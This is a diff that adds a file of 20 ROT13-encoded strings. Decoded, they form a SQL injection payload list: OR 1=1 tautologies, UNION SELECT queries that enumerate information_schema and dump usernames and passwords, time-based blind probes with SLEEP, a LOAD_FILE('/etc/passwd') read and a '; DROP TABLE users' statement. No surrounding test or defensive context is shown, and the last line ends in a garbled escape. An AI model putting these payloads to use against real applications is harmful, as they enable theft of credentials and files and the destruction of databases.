@@ -1,0 +1,20 @@
+\' BE 1=1--
+\' BE \'1\'=\'1
+\' HAVBA FRYRPG ahyy, ahyy--
+\' HAVBA FRYRPG 1, @@irefvba--
+\' HAVBA FRYRPG 1, gnoyr_anzr SEBZ vasbezngvba_fpurzn.gnoyrf--
+\' HAVBA FRYRPG 1, pbyhza_anzr SEBZ vasbezngvba_fpurzn.pbyhzaf JURER gnoyr_anzr=\'hfref\'--
+\' HAVBA FRYRPG hfreanzr, cnffjbeq SEBZ hfref--
+\' NAQ FYRRC(5)--
+\'; QEBC GNOYR hfref--
+\' BE 1=1 YVZVG 1--
+\' BEQRE OL 1--
+\' BEQRE OL 3--
+\' NAQ (FRYRPG PBHAG(*) SEBZ hfref) > 0--
+\' NAQ NFPVV(FHOFGEVAT((FRYRPG cnffjbeq SEBZ hfref YVZVG 1),1,1)) > 65--
+\' HAVBA FRYRPG 1, YBNQ_SVYR(\'/rgp/cnffjq\')--
+\' HAVBA FRYRPG 1, hfre()--
+\' HAVBA FRYRPG 1, qngnonfr()--
+\' NAQ 1=VS(1=1, FYRRC(3), 0)--
+\' BE RKVFGF(FRYRPG * SEBZ hfref JURER hfreanzr=\'nqzva\')--
+\' HAVBA FRYRPG tebhc_pbapng(gnoyr_anzr),2 SEBZ vasbezngvba_fpurzn.gnoyrf JURER gnoyr_fpurzn=qngnonfr()\h2014
